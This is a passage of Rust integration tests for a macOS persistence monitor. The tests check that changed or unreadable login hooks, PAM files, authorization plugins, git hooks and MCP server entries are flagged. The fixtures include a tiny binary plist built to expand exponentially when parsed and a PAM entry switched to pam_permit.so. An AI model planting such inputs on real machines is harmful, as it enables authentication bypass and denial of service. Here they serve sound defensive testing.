    assert!(e.found().is_empty(), "{:?}", e.found());
    // Answered, its row among the answered names what was read too.
    let page = e.page("view.html");
    let answered = &page[page.find("<p class=\"fg answered\">").unwrap()..];
    assert!(
        answered.contains("<span class=\"fw\">1 project</span>"),
        "{answered}"
    );
    let evil = e.checkout(".cache/evil");
    put(&evil.join(".git/hooks/post-merge"), "#!/bin/sh\n");
    let printed = e.run_in(&e.home().join(".cache"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/.cache/evil (1)"]);
    assert!(printed.contains("1 new in this run"), "{printed}");
    // While that one is open, the next check's first readings are an item of their own.
    let other = e.checkout(".config/other");
    put(&other.join(".git/hooks/pre-push"), "#!/bin/sh\n");
    // In a later second than the check before, so that the two items are listed in the order
    // they came: the store keeps whole seconds, and a quick build runs both in one.
    common::next_second();
    let printed = e.run_in(&e.home().join(".config"));
    assert!(printed.contains("1 new in this run"), "{printed}");
    assert_eq!(
        e.told(),
        [
            "checkout:machine:mac/.cache/evil (1)",
            "checkout:machine:mac/.config/other (1)"
        ]
    );
}

// Places of persistence read by the user: login hooks, PAM and authorization plugins.

const LOGIN_HOOK_KIND: &str = "login and logout hooks in the login window's preferences";
const AUTH_KIND: &str = "PAM policies and modules, and authorization plugins";
const PREFS: &str = "Library/Preferences/com.apple.loginwindow.plist";

/// The login window's preferences in the home folder, as XML, holding `entries`.
fn login_window(home: &Path, entries: &str) -> PathBuf {
    let path = home.join(PREFS);
    put(
        &path,
        &format!(
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\"><dict>{entries}</dict></plist>\n"
        ),
    );
    path
}

/// Paths whose permissions are taken away while it lives, and given back, as given, when it
/// is dropped, whatever the test did.
struct Closed(Vec<(PathBuf, u32)>);

impl Closed {
    fn new(paths: &[(&Path, u32)]) -> Closed {
        use std::os::unix::fs::PermissionsExt;
        for (path, _) in paths {
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o000)).unwrap();
        }
        Closed(paths.iter().map(|(p, m)| (p.to_path_buf(), *m)).collect())
    }
}

impl Drop for Closed {
    fn drop(&mut self) {
        use std::os::unix::fs::PermissionsExt;
        for (path, mode) in &self.0 {
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(*mode));
        }
    }
}

/// The subjects the journal says were removed from the places of persistence.
fn removed(e: &Estate) -> Vec<String> {
    e.rows(&format!(
        "SELECT subject FROM journal WHERE entry = 'removed' AND predicate = 'watched_as'
           AND kind IN ('{}', '{AUTH_KIND}')",
        LOGIN_HOOK_KIND.replace('\'', "''")
    ))
}

#[test]
fn losing_sight_of_a_login_hook_a_pam_file_or_the_plugins_folder_read_before_raises_its_rule_with_why()
 {
    // Someone who wants to change one of these unseen would break its reading first. Losing
    // sight of a hook, a PAM file or the plugins folder read before is a finding of its kind
    // with why; none of them goes quiet, and nothing in them is told as removed.
    let e = Estate::new("lose-sight-persistence");
    let prefs = login_window(
        &e.home(),
        "<key>LoginHook</key><string>/Users/Shared/a.sh</string>",
    );
    let sys = e.0.join("system");
    let pam = sys.join("etc/pam.d/sudo");
    put(&pam, "auth sufficient pam_tid.so\n");
    let plugins = sys.join("Library/Security/SecurityAgentPlugins");
    put(
        &plugins.join("Example.bundle/Contents/Info.plist"),
        "<plist><dict/></plist>\n",
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    {
        let _closed = Closed::new(&[(&prefs, 0o644), (&pam, 0o644), (&plugins, 0o755)]);
        e.run();
    }
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.authentication",
                "/Library/Security/SecurityAgentPlugins"
            ),
            pair("watched.authentication", "/etc/pam.d/sudo"),
            pair("watched.login-hook", &format!("~/{PREFS}")),
        ]
    );
    let why =
        e.rows("SELECT subject, new_value FROM journal WHERE entry = 'not_read' ORDER BY subject");
    assert_eq!(why.len(), 3, "{why:?}");
    assert!(
        why.iter()
            .all(|w| w.ends_with("Permission denied (os error 13)")),
        "{why:?}"
    );
    assert!(removed(&e).is_empty(), "{:?}", removed(&e));
    let live = e.rows(
        "SELECT subject FROM assertion WHERE layer = 'live' AND predicate = 'watched_as'
           AND (subject LIKE '%loginwindow%' OR subject LIKE '%pam.d%' OR subject LIKE '%.bundle')
         ORDER BY subject",
    );
    assert_eq!(
        live,
        [
            "file:machine:mac//Library/Security/SecurityAgentPlugins/Example.bundle".to_string(),
            "file:machine:mac//etc/pam.d/sudo".to_string(),
            format!("file:machine:mac/{PREFS}#/LoginHook"),
        ]
    );
}

#[test]
fn a_hook_beside_one_that_cannot_be_read_is_still_compared_and_the_unread_one_is_named_never_gone()
{
    // One value of the login window's preferences that cannot be read leaves the other read:
    // its change is found, the unread one is named with why and kept as it was known, and
    // losing sight of that part is found, as the part.
    let e = Estate::new("hook-part-unread");
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/Users/Shared/a.sh</string>\
         <key>LogoutHook</key><string>/Users/Shared/b.sh</string>",
    );
    e.run();
    let logout = format!("file:machine:mac/{PREFS}#/LogoutHook");
    let content = |id: &str| {
        e.rows(&format!(
            "SELECT object FROM assertion WHERE layer = 'live' AND predicate = 'has_content'
               AND subject = '{id}'"
        ))
    };
    let before = content(&logout);
    assert_eq!(before.len(), 1);
    // Deeper than the build follows a value.
    let deep = format!(
        "{}<string>/Users/Shared/b.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    login_window(
        &e.home(),
        &format!(
            "<key>LoginHook</key><string>/Users/Shared/c.sh</string><key>LogoutHook</key>{deep}"
        ),
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook")),
            pair("watched.login-hook", &format!("~/{PREFS}#/LogoutHook")),
        ]
    );
    let coverage = e.coverage(LOGIN_HOOK_KIND);
    assert!(
        coverage.contains(&format!(
            "{PREFS}#/LogoutHook (a value nested deeper than this build reads)"
        )),
        "{coverage}"
    );
    assert!(!coverage.contains("none of these places"), "{coverage}");
    assert!(removed(&e).is_empty(), "{:?}", removed(&e));
    assert_eq!(content(&logout), before);
    // The hook that was read is gone from a dictionary read whole: that is told, and the one
    // still unread is not.
    login_window(&e.home(), &format!("<key>LogoutHook</key>{deep}"));
    e.run();
    assert_eq!(
        removed(&e),
        [format!("file:machine:mac/{PREFS}#/LoginHook")]
    );
    assert_eq!(content(&logout), before);
}

#[test]
fn a_kind_of_place_read_in_part_with_nothing_found_never_says_there_is_none() {
    // A preferences file that cannot be parsed and a plugins folder that cannot be listed may
    // hold a hook or a plugin: the page says what could not be read, never that there is none.
    let e = Estate::new("none-from-part");
    put(&e.home().join(PREFS), "\u{0}\u{1} not a property list");
    let plugins = e.0.join("system/Library/Security/SecurityAgentPlugins");
    std::fs::create_dir_all(&plugins).unwrap();
    {
        let _closed = Closed::new(&[(&plugins, 0o755)]);
        e.run();
    }
    for kind in [LOGIN_HOOK_KIND, AUTH_KIND] {
        let coverage = e.coverage(kind);
        assert!(
            coverage.starts_with("none|could not be read: "),
            "{coverage}"
        );
    }
    let page = e.this_mac_page();
    let section = |id: &str| {
        let start = page
            .find(&format!("<section id=\"{id}\">"))
            .unwrap_or_else(|| panic!("{id}"));
        page[start..start + page[start..].find("</section>").unwrap()].to_string()
    };
    for id in ["login-and-logout-hooks", "login-and-password-modules"] {
        let shown = section(id);
        assert!(!shown.contains("None found here."), "{shown}");
        assert!(
            shown.contains("Not read in full, so this list may not be whole"),
            "{shown}"
        );
    }
    // A kind read in full with nothing there still says so.
    assert!(section("ssh-files").contains("None found here."));
}

#[test]
fn a_plugin_watched_only_for_whether_it_is_there_is_never_said_to_be_unchanged() {
    // An authorization plugin is a folder: its arrival and departure are seen, a change inside
    // it is not. What a person reads says so, and never that it has not changed.
    let e = Estate::new("presence-only");
    let plugins = e.0.join("system/Library/Security/SecurityAgentPlugins");
    put(
        &plugins.join("Example.bundle/Contents/Info.plist"),
        "<plist><dict/></plist>\n",
    );
    put(
        &e.0.join("system/etc/pam.d/sudo"),
        "auth sufficient pam_tid.so\n",
    );
    e.run();
    let page = e.this_mac_page();
    let start = page
        .find("<section id=\"login-and-password-modules\">")
        .unwrap();
    let section = &page[start..start + page[start..].find("</section>").unwrap()];
    let row = |name: &str| {
        let at = section.find(name).unwrap_or_else(|| panic!("{section}"));
        section[at..at + section[at..].find("</tr>").unwrap()].to_string()
    };
    let bundle = row("Example.bundle");
    assert!(
        bundle.contains("a change inside it is not seen, only whether it is there")
            && !bundle.contains("not since first seen"),
        "{bundle}"
    );
    // A file whose content is compared says it has not changed since it was first seen.
    assert!(row("/etc/pam.d/sudo").contains("not since first seen"));
}

#[test]
fn byhost_and_managed_preferences_are_named_as_not_read() {
    // A login hook can be set where this version does not read: the limits say where.
    let e = Estate::new("unread-preferences");
    e.run();
    let status = e.status();
    let cannot: Vec<&str> = status["cannot_judge"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|s| s.as_str())
        .collect();
    let persistence = cannot
        .iter()
        .find(|s| s.contains("places of persistence"))
        .unwrap_or_else(|| panic!("{cannot:?}"));
    assert!(
        persistence.contains("ByHost preferences") && persistence.contains("Managed Preferences"),
        "{persistence}"
    );
    let item = status["not_covered"]
        .as_array()
        .unwrap()
        .iter()
        .find(|u| u["id"] == "persistence-not-read")
        .unwrap_or_else(|| panic!("{status:#}"))
        .clone();
    let meaning = item["meaning"].as_str().unwrap();
    assert!(
        meaning.contains("ByHost preferences") && meaning.contains("Managed Preferences"),
        "{meaning}"
    );
    // The places not checked on the macOS this Mac runs: one count, said to an agent in
    // `cannot_judge` and to a person as an item. None of them is checked on any version yet.
    let moved = cannot
        .iter()
        .find(|s| s.contains("places where code can be set to run by itself"))
        .unwrap_or_else(|| panic!("{cannot:?}"));
    let item = status["not_covered"]
        .as_array()
        .unwrap()
        .iter()
        .find(|u| u["id"] == "autorun-not-checked-on-this-macos")
        .unwrap_or_else(|| panic!("{status:#}"));
    let n = item["count"].as_u64().unwrap();
    assert!(
        moved.starts_with(&format!("none of the {n} places"))
            || moved.contains(&format!("all {n} places")),
        "{moved}"
    );
}

/// An invented binary property list of the login window's preferences: `LoginHook` is a chain
/// of `d` arrays, each referring `k` times to the next, k^d leaves in a few hundred bytes;
/// `LogoutHook` is `logout`, a short path.
fn shared_refs(k: u8, d: u8, logout: &str) -> Vec<u8> {
    assert!(logout.len() < 15);
    let mut objects: Vec<Vec<u8>> = vec![
        vec![0xD2, 1, 2, 3, 4 + d],
        [&[0x59][..], b"LoginHook"].concat(),
        [&[0x5A][..], b"LogoutHook"].concat(),
    ];
    for level in 0..d {
        let mut array = vec![0xA0 | k];
        array.extend(std::iter::repeat_n(3 + level + 1, k as usize));
        objects.push(array);
    }
    objects.push(vec![0xA0]);
    objects.push([&[0x50 | logout.len() as u8][..], logout.as_bytes()].concat());
    let mut out = b"bplist00".to_vec();
    let mut offsets = Vec::new();
    for o in &objects {
        offsets.push(out.len() as u16);
        out.extend_from_slice(o);
    }
    let table = out.len() as u64;
    for o in offsets {
        out.extend_from_slice(&o.to_be_bytes());
    }
    out.extend_from_slice(&[0, 0, 0, 0, 0, 0, 2, 1]);
    out.extend_from_slice(&(objects.len() as u64).to_be_bytes());
    out.extend_from_slice(&0u64.to_be_bytes());
    out.extend_from_slice(&table.to_be_bytes());
    out
}

/// The most memory any finished child of this test process took, in bytes.
fn children_peak() -> i64 {
    // SAFETY: `usage` is a plain struct the call fills.
    let mut usage: libc::rusage = unsafe { std::mem::zeroed() };
    assert_eq!(
        unsafe { libc::getrusage(libc::RUSAGE_CHILDREN, &mut usage) },
        0
    );
    usage.ru_maxrss
}

#[test]
fn a_small_preferences_file_whose_hook_refers_to_one_array_many_times_never_stops_the_run() {
    // Any program running as the user can write the login window's preferences. A value that
    // refers to one array from many places is k^d leaves to a walk that does not notice:
    // that key is named as too large to read, the key beside it is still compared, and every
    // other reader of the same run is in the store.
    let e = Estate::new("shared-refs");
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/tmp/a.sh</string>\
         <key>LogoutHook</key><string>/tmp/b.sh</string>",
    );
    e.run();
    let file = shared_refs(8, 12, "/tmp/c.sh");
    assert!(file.len() < 256, "{}", file.len());
    std::fs::write(e.home().join(PREFS), &file).unwrap();
    put(
        &e.home()
            .join("Library/LaunchAgents/com.example.invented.plist"),
        "<plist><dict/></plist>\n",
    );
    let mut child = e
        .command(Some(&e.home()), &e.0.join("empty"))
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .unwrap();
    let started = std::time::Instant::now();
    let status = loop {
        if let Some(status) = child.try_wait().unwrap() {
            break status;
        }
        if started.elapsed() > std::time::Duration::from_secs(60) {
            let _ = child.kill();
            let _ = child.wait();
            panic!("the run did not finish within a minute");
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    };
    assert!(status.success());
    assert!(children_peak() < 512 << 20, "{}", children_peak());
    let coverage = e.coverage(LOGIN_HOOK_KIND);
    assert!(
        coverage.contains(&format!(
            "{PREFS}#/LoginHook (its value is larger than this version reads)"
        )),
        "{coverage}"
    );
    assert_eq!(
        e.found(),
        [
            pair(
                "watched.autostart",
                "~/Library/LaunchAgents/com.example.invented.plist"
            ),
            pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook")),
            pair("watched.login-hook", &format!("~/{PREFS}#/LogoutHook")),
        ]
    );
    assert!(removed(&e).is_empty(), "{:?}", removed(&e));
}

/// Each table row of every page that names `name`, from where it names it to the row's end.
fn rows_naming(pages: &[String], name: &str) -> Vec<String> {
    let mut out = Vec::new();
    for page in pages {
        let mut from = 0;
        while let Some(at) = page[from..].find(name) {
            let at = from + at;
            let end = page[at..].find("</tr>").map_or(page.len(), |e| at + e);
            let opened = page[..at].rfind("<tr");
            if opened.is_some() && opened > page[..at].rfind("</tr>") {
                out.push(page[at..end].to_string());
            }
            from = end.max(at + 1);
        }
    }
    out
}

/// Every page `immunity view` writes.
fn all_pages(e: &Estate) -> Vec<String> {
    let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
        .args(["view", "--no-open", "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    assert!(out.status.success());
    String::from_utf8(out.stdout)
        .unwrap()
        .lines()
        .filter(|p| p.ends_with(".html"))
        .map(|p| std::fs::read_to_string(p).unwrap())
        .collect()
}

#[test]
fn an_entry_the_last_check_did_not_read_is_never_said_unchanged_and_shows_that_reading() {
    // A hook in preferences that no longer parse and a PAM file that cannot be opened were
    // read before: what is shown of them says the last check did not read them, with why,
    // never that they have not changed, and never the full reading of an earlier check.
    let e = Estate::new("unread-not-unchanged");
    login_window(&e.home(), "<key>LoginHook</key><string>/tmp/a.sh</string>");
    let pam = e.0.join("system/etc/pam.d/sudo");
    put(&pam, "auth sufficient pam_tid.so\n");
    e.run();
    let unchanged = all_pages(&e);
    for name in [format!("{PREFS}#/LoginHook"), "/etc/pam.d/sudo".to_string()] {
        let rows = rows_naming(&unchanged, &name);
        assert!(
            rows.iter().any(|r| r.contains("not since first seen")),
            "{rows:?}"
        );
    }
    put(&e.home().join(PREFS), "\u{0}\u{1} not a property list");
    {
        let _closed = Closed::new(&[(&pam, 0o644)]);
        e.run();
    }
    let pages = all_pages(&e);
    for (name, why) in [
        (format!("{PREFS}#/LoginHook"), "not a property list"),
        ("/etc/pam.d/sudo".to_string(), "Permission denied"),
    ] {
        let rows = rows_naming(&pages, &name);
        for row in &rows {
            assert!(!row.contains("not since first seen"), "{row}");
            assert!(!row.contains("badge good"), "{row}");
        }
        // The page of this Mac and the technical page each say it, with why.
        let said = rows
            .iter()
            .filter(|r| r.contains("not read at the last check") && r.contains(why))
            .count();
        assert_eq!(said, 2, "{name}: {rows:?}");
    }
}

#[test]
fn a_part_that_failed_and_was_answered_never_silences_losing_sight_of_the_whole_file() {
    // The logout hook nested too deep is found, as the part it is, and answered. When the
    // whole file can no longer be read later, with a new login hook in it, that is a change of
    // its own: found, journalled with why, and the row says the file was not read.
    let e = Estate::new("part-then-whole");
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/tmp/a.sh</string>\
         <key>LogoutHook</key><string>/tmp/b.sh</string>",
    );
    e.run();
    let deep = format!(
        "{}<string>/tmp/b.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    login_window(
        &e.home(),
        &format!("<key>LoginHook</key><string>/tmp/a.sh</string><key>LogoutHook</key>{deep}"),
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "watched.login-hook",
            &format!("~/{PREFS}#/LogoutHook")
        )]
    );
    e.seen();
    // Over the size cap: macOS still reads a file this large, this build does not.
    let pad = "x".repeat(9 * 1024 * 1024);
    login_window(
        &e.home(),
        &format!(
            "<key>LoginHook</key><string>/tmp/c.sh</string><key>Pad</key><string>{pad}</string>"
        ),
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair("watched.login-hook", &format!("~/{PREFS}"))]
    );
    let journal = e.rows(
        "SELECT subject, new_value FROM journal WHERE entry = 'not_read' ORDER BY seq DESC LIMIT 1",
    );
    assert_eq!(
        journal,
        [format!(
            "file:machine:mac/{PREFS}|over the size cap of 8 MiB"
        )]
    );
    let rows = rows_naming(&all_pages(&e), &format!("{PREFS}#/LoginHook"));
    assert!(rows.iter().all(|r| !r.contains("not since")), "{rows:?}");
    let said = rows
        .iter()
        .filter(|r| r.contains("not read at the last check") && r.contains("size cap"))
        .count();
    assert_eq!(said, 2, "{rows:?}");
}

#[test]
fn a_part_answered_still_lets_a_later_change_beside_it_be_found() {
    // The answer to the part is about the part: a new login hook beside it is found.
    let e = Estate::new("part-then-change");
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/tmp/a.sh</string>\
         <key>LogoutHook</key><string>/tmp/b.sh</string>",
    );
    e.run();
    let deep = format!(
        "{}<string>/tmp/b.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    let with = |hook: &str| {
        format!("<key>LoginHook</key><string>{hook}</string><key>LogoutHook</key>{deep}")
    };
    login_window(&e.home(), &with("/tmp/a.sh"));
    e.run();
    e.seen();
    login_window(&e.home(), &with("/tmp/c.sh"));
    e.run();
    assert_eq!(
        e.found(),
        [pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook"))]
    );
    // Once the whole file is read again, the part failing again is found again.
    e.seen();
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/tmp/c.sh</string>\
         <key>LogoutHook</key><string>/tmp/b.sh</string>",
    );
    e.run();
    assert!(e.found().is_empty(), "{:?}", e.found());
    login_window(&e.home(), &with("/tmp/c.sh"));
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "watched.login-hook",
            &format!("~/{PREFS}#/LogoutHook")
        )]
    );
}

#[test]
fn a_part_read_again_can_fail_again_even_while_another_part_is_unread() {
    let e = Estate::new("alternating-unread-parts");
    let deep = format!(
        "{}<string>/tmp/hook.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    let path = "<string>/tmp/hook.sh</string>";
    let write = |login: &str, logout: &str| {
        login_window(
            &e.home(),
            &format!("<key>LoginHook</key>{login}<key>LogoutHook</key>{logout}"),
        );
        e.run();
    };
    write(path, path);
    write(&deep, path);
    let login = pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook"));
    let logout = pair("watched.login-hook", &format!("~/{PREFS}#/LogoutHook"));
    assert_eq!(e.found(), std::slice::from_ref(&login));
    e.seen();
    write(path, &deep);
    assert_eq!(e.found(), [logout]);
    e.seen();
    write(&deep, &deep);
    assert_eq!(e.found(), std::slice::from_ref(&login));
    e.seen();
    // An absent key is known too: the old failure no longer applies if it comes back.
    login_window(&e.home(), &format!("<key>LogoutHook</key>{deep}"));
    e.run();
    e.seen();
    write(&deep, &deep);
    assert_eq!(e.found(), [login]);
}

#[test]
fn recovering_any_key_ends_a_whole_file_failure_without_quieting_an_unread_sibling() {
    let deep = format!(
        "{}<string>/tmp/logout.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    let login = "<key>LoginHook</key><string>/tmp/login.sh</string>";
    for (label, recovered) in [("read", login), ("absent", "")] {
        let e = Estate::new(label);
        let prefs = login_window(
            &e.home(),
            &format!("{recovered}<key>LogoutHook</key><string>/tmp/logout.sh</string>"),
        );
        e.run();
        let file = pair("watched.login-hook", &format!("~/{PREFS}"));
        let key = pair("watched.login-hook", &format!("~/{PREFS}#/LogoutHook"));
        let fail_whole = || {
            put(&prefs, "\u{0}\u{1} not a property list");
            e.run();
            assert!(e.coverage(LOGIN_HOOK_KIND).starts_with("none|"));
            assert_eq!(e.found(), std::slice::from_ref(&file), "{label}");
        };
        let recover_part = || {
            login_window(
                &e.home(),
                &format!("{recovered}<key>LogoutHook</key>{deep}"),
            );
            e.run();
            assert!(e.coverage(LOGIN_HOOK_KIND).starts_with("partial|"));
        };
        fail_whole();
        e.seen();
        recover_part();
        assert_eq!(e.found(), [key]);
        e.seen();
        let before = e.last_entry();
        fail_whole();
        let losses = e.rows(&format!(
            "SELECT subject FROM journal WHERE entry = 'not_read' AND seq > {before}"
        ));
        assert_eq!(losses, [format!("file:machine:mac/{PREFS}")]);
        e.seen();
        recover_part();
        assert!(e.found().is_empty(), "{label}: {:?}", e.found());
    }
}

#[test]
fn losing_sight_of_a_read_part_is_found_even_if_the_whole_file_was_never_read() {
    let e = Estate::new("unread-whole-with-read-part");
    let deep = format!(
        "{}<string>/tmp/hook.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    let write = |login: &str| {
        login_window(
            &e.home(),
            &format!("<key>LoginHook</key>{login}<key>LogoutHook</key>{deep}"),
        );
        e.run();
    };
    let prefs = e.home().join(PREFS);
    put(&prefs, "\u{0}\u{1} not a property list");
    e.run();
    // A valid dictionary alone is insufficient. Neither hook could be read.
    write(&deep);
    let whole_failure = || {
        e.rows(&format!(
            "SELECT unit FROM unit_unread WHERE unit = '{PREFS}'"
        ))
    };
    assert_eq!(whole_failure(), [PREFS]);
    e.seen();
    write("<string>/tmp/hook.sh</string>");
    assert!(whole_failure().is_empty());
    e.seen();
    // The released whole-unit query cannot take this successful key for a full file read.
    let db = Connection::open(e.store()).unwrap();
    let full: bool = db
        .query_row(
            "SELECT EXISTS (SELECT 1 FROM unit_read
         WHERE reader = 'watched-places' AND kind = ?1 AND unit = ?2 AND how = 'read')",
            rusqlite::params![LOGIN_HOOK_KIND, PREFS],
            |row| row.get(0),
        )
        .unwrap();
    assert!(!full);
    drop(db);
    write(&deep);
    assert_eq!(
        e.found(),
        [pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook"))]
    );
}

#[test]
fn a_hook_previously_unread_is_reported_as_first_read_even_when_its_sibling_is_known() {
    let e = Estate::new("part-first-read");
    let deep = format!(
        "{}<string>/tmp/hook.sh</string>{}",
        "<array>".repeat(40),
        "</array>".repeat(40)
    );
    login_window(&e.home(), &format!("<key>LogoutHook</key>{deep}"));
    e.run();
    login_window(
        &e.home(),
        "<key>LoginHook</key><string>/tmp/login.sh</string>\
         <key>LogoutHook</key><string>/tmp/logout.sh</string>",
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(FIRST_READ, "mac"),
            pair("watched.login-hook", &format!("~/{PREFS}#/LoginHook")),
        ]
    );
}

#[test]
fn losing_sight_of_a_whole_preferences_file_with_a_new_hook_in_it_is_found() {
    let e = Estate::new("whole-unread");
    login_window(&e.home(), "<key>LoginHook</key><string>/tmp/a.sh</string>");
    e.run();
    let pad = "x".repeat(9 * 1024 * 1024);
    login_window(
        &e.home(),
        &format!(
            "<key>LoginHook</key><string>/tmp/c.sh</string><key>Pad</key><string>{pad}</string>"
        ),
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair("watched.login-hook", &format!("~/{PREFS}"))]
    );
}

#[test]
fn a_hash_in_a_checkout_or_selected_key_is_kept_as_part_of_its_own_name() {
    let e = Estate::new("hash-checkout");
    let path = e.checkout("dev/demo#/child").join(".mcp.json");
    e.run();
    put(
        &path,
        r#"{"mcpServers":{"helper#/{x}":{"command":"example"}}}"#,
    );
    e.run();
    let place = "~/dev/demo#/child/.mcp.json#/mcpServers/helper#~1{x}";
    assert_eq!(e.found(), [pair("autorun.agent-start", place)]);
    e.seen();
    {
        let _closed = Closed::new(&[(&path, 0o644)]);
        e.run();
        assert_eq!(
            e.found(),
            [pair("autorun.agent-start", "~/dev/demo#/child/.mcp.json")]
        );
        assert_eq!(
            e.rows(
                "SELECT subject FROM assertion WHERE layer = 'live'
             AND predicate = 'watched_as' AND subject LIKE '%/mcpServers/%'"
            ),
            [format!("file:machine:mac/{}", &place[2..])]
        );
    }
    e.seen();
    put(
        &path,
        r#"{"mcpServers":{"helper#/{x}":{"command":"other"}}}"#,
    );
    e.run();
    assert_eq!(e.found(), [pair("autorun.agent-start", place)]);
}

#[test]
fn a_pam_file_whose_name_holds_a_hash_sign_is_a_unit_of_its_own() {
    // `login#2` is a file beside `login`, not a part of it: when it cannot be read, what was
    // known of `login` is not kept on its account, so `login` going is told, and losing sight
    // of `login#2` is found as itself.
    let e = Estate::new("hash-name");
    let pam = e.0.join("system/etc/pam.d");
    put(&pam.join("login"), "auth required pam_tid.so\n");
    put(&pam.join("login#2"), "auth required pam_tid.so\n");
    e.run();
    std::fs::remove_file(pam.join("login")).unwrap();
    {
        let _closed = Closed::new(&[(&pam.join("login#2"), 0o644)]);
        e.run();
    }
    assert_eq!(removed(&e), ["file:machine:mac//etc/pam.d/login"]);
    assert_eq!(
        e.found(),
        [
            pair("watched.authentication", "/etc/pam.d/login"),
            pair("watched.authentication", "/etc/pam.d/login#2"),
        ]
    );
}

#[test]
fn a_plugin_watched_only_for_presence_is_said_so_in_status_and_in_its_finding() {
    // What an agent or a person reads of the plugin, other than the pages, says that a change
    // inside it is not seen.
    let e = Estate::new("presence-said");
    put(
        &e.0.join("system/etc/pam.d/sudo"),
        "auth sufficient pam_tid.so\n",
    );
    std::fs::create_dir_all(e.0.join("system/Library/Security/SecurityAgentPlugins")).unwrap();
    e.run();
    put(
        &e.0.join(
            "system/Library/Security/SecurityAgentPlugins/Example.bundle/Contents/Info.plist",
        ),
        "<plist><dict/></plist>\n",
    );
    e.run();
    let said = "a change inside it is not seen, only whether it is there";
    let kind = e.status()["watched"]["kinds"]
        .as_array()
        .unwrap()
        .iter()
        .find(|k| k["kind"] == "authentication module")
        .unwrap()
        .clone();
    assert_eq!(
        (
            &kind["files"],
            &kind["presence_only"],
            &kind["presence_only_note"]
        ),
        (&2.into(), &1.into(), &said.into()),
        "{kind}"
    );
    let text = |args: &[&str]| {
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(args)
            .arg("--store")
            .arg(e.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        String::from_utf8(out.stdout).unwrap()
    };
    let presence = |id: &str, expected: bool| {
        let json = e.contract(&["finding", id]);
        assert_eq!(json["evidence"]["place_changed"]["presence_only"], expected);
        let out = Command::new(env!("CARGO_BIN_EXE_immunity"))
            .args(["finding", id, "--proto", "--store"])
            .arg(e.store())
            .output()
            .unwrap();
        assert!(out.status.success());
        let found = v1::Finding::decode(out.stdout.as_slice()).unwrap();
        let Some(v1::evidence::Body::PlaceChanged(place)) = found.evidence.unwrap().body else {
            panic!("expected place_changed");
        };
        assert_eq!(place.presence_only, Some(expected));
    };
    let status = text(&["status", "--coverage"]);
    assert!(
        status.contains(&format!("1 entry watched only for presence: {said}")),
        "{status}"
    );
    let found = e.findings(false);
    assert_eq!(found.len(), 1, "{found:?}");
    let listed = e.contract(&["findings"]);
    let id = listed["findings"][0]["finding"]["id"].as_str().unwrap();
    presence(id, true);
    let finding = text(&["finding", id]);
    assert!(
        finding.contains(&format!("\n    Watched      {said}\n")),
        "{finding}"
    );
    // A file whose content is compared says nothing of the kind.
    put(
        &e.0.join("system/etc/pam.d/sudo"),
        "auth sufficient pam_permit.so\n",
    );
    e.seen();
    e.run();
    let listed = e.contract(&["findings"]);
    let id = listed["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["finding"]["state"] == "open")
        .unwrap()["finding"]["id"]
        .as_str()
        .unwrap()
        .to_string();
    presence(&id, false);
    assert!(!text(&["finding", &id]).contains("\n    Watched "));

    // The finding of a plugin that went still says how it was watched.
    e.seen();
    std::fs::remove_dir_all(
        e.0.join("system/Library/Security/SecurityAgentPlugins/Example.bundle"),
    )
    .unwrap();
    e.run();
    let listed = e.contract(&["findings"]);
    let gone = listed["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|f| f["finding"]["state"] == "open")
        .unwrap()["finding"]["id"]
        .as_str()
        .unwrap();
    let finding = e.contract(&["finding", gone]);
    assert_eq!(finding["evidence"]["place_changed"]["change"], "gone");
    presence(gone, true);
}

#[test]
fn what_an_earlier_build_read_and_no_row_names_now_is_retired_never_counted_or_told_as_removed() {
    // A shell profile and a key of a project's MCP servers that an earlier build read, and
    // that no row of this build names: the next full run closes them as retired, with why.
    let e = Estate::new("retired");
    put(&e.home().join(".zshrc"), "export A=1\n");
    let c = e.checkout("dev/app");
    put(
        &c.join(".mcp.json"),
        r#"{"mcpServers": {"x": {"command": "npx"}}}"#,
    );
    e.run();
    let gone = [
        (
            "file:machine:mac/.zfoo",
            "file:machine:mac/.zshrc",
            "shell profiles of zsh and bash",
        ),
        (
            "file:machine:mac/dev/app/.mcp.json#/other/x",
            "file:machine:mac/dev/app/.mcp.json#/mcpServers/x",
            ".mcp.json of each checkout, the part that runs by itself",
        ),
    ];
    {
        // As the earlier build left them, beside what this build still reads.
        let db = Connection::open(e.store()).unwrap();
        for (subject, like, kind) in gone {
            db.execute(
